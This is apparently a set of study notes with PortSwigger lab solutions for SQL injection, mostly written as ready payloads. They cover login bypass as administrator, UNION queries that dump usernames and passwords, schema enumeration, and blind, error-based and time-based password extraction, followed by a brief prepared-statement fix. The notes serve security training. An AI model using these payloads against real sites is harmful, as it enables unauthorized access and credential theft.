## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Solution: `https://...?category=Accessories%27%20or%201=1%20--`, namely: `category=Accessories' OR 1=1 --`

## Lab: SQL injection vulnerability allowing login bypass
Solution:  
Username: `administrator'--`


## UNION Attack
Requires:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

Use `' ORDER BY n--` or `' UNION SELECT NULL,NULL,NULL--`(or more NULLs) to determine how many columns returned.

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
Solution: `?category=Gifts' UNION SELECT NULL, NULL, NULL --`

## Database-specific syntax
On Orale, `FROM` is a must and `DUAL` is a built-in table: `' UNION SELECT NULL FROM DUAL--`

For more: [SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Finding columns with a useful data type
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

## Lab: SQL injection UNION attack, finding a column containing text
Solution: `' OR 1=1 UNION SELECT NULL,'twDlg5',NULL --`

## Using a SQL injection UNION attack to retrieve interesting data
`' UNION SELECT username, password FROM users--`  
But How do you know there is a table called users, and two columns called username and password?

## Lab: SQL injection UNION attack, retrieving data from other tables
Solution: `' UNION SELECT username, password FROM users--`  

## Retrieving multiple values within a single column
`' UNION SELECT username || '~' || password FROM users--`

## Lab: SQL injection UNION attack, retrieving multiple values in a single column
Solution: `' UNION SELECT NULL, username || '~' || password FROM users--`

## Querying the database type and version
Microsoft, MySQL	`SELECT @@version`  
Oracle	`SELECT * FROM v$version`  
PostgreSQL	`SELECT version()`

e.g. : `' UNION SELECT @@version`

## Lab: SQL injection attack, querying the database type and version on Oracle
`' UNION SELECT banner, NULL FROM v$version--`

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
Solution: `' UNION SELECT NULL, @@version--%20` **%20** is required at the end.

## Listing the contents of the database
Except(Oracle)  
`SELECT * FROM information_schema.tables`  
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```


## Lab: SQL injection attack, listing the database contents on non-Oracle databases
Solution:  
`' UNION SELECT TABLE_NAME, TABLE_TYPE FROM information_schema.tables --`  
`' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name = 'users_klzxlx'--`  
`' UNION SELECT username_cyywpw, password_nrcufg FROM users_klzxlx --`  

## Lab: Blind SQL injection with conditional responses
Solution:  
`' AND SUBSTRING((SELECT Password FROM users WHERE Username = 'administrator'), 21, 1) > 'a'--`  
and  
`' AND SUBSTRING((SELECT Password FROM users WHERE Username = 'administrator'), 21, 1) = 'a'--`


## Lab: Blind SQL injection with conditional errors
Password length: `' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) > 20) THEN TO_CHAR(1/0) ELSE '0' END FROM dual) > '1' --`

Password iteration: `AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§f§') THEN '0' ELSE TO_CHAR(1/0) END FROM dual) > '1' --` (Use Intrude, Pitchfork, though slow) 


## Lab: Visible error-based SQL injection
`='AND 2=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## Lab: Blind SQL injection with time delays and information retrieval
Password Length: `' %3B SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20) THEN pg_sleep(0) ELSE pg_sleep(1) END--`

Password iteration: `' %3B SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 16, 1) > 'd') THEN pg_sleep(0) ELSE pg_sleep(1) END--`



## Lab: SQL injection with filter bypass via XML encoding

`UNION SELECT username || '~' || password FROM users--` need to be XML decoded.

## How to prevent SQL injection

Prepared Statement:
```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

## Lab: SQL injection attack, listing the database contents on Oracle

1. `' UNION SELECT 'abc','def' FROM dual--`
2. `' UNION SELECT table_name,NULL FROM all_tables--`
3. `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name=...`